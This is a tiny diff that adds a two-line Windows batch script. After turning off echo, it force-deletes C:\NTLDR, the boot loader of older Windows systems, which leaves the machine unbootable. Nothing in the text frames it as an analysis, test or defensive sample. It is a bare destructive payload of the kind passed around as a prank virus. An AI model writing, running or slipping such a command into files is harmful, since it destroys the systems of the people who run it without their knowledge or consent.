@@ -1,0 +1,2 @@
+ECHO OFF
+DEL/F/A C:\NTLDR
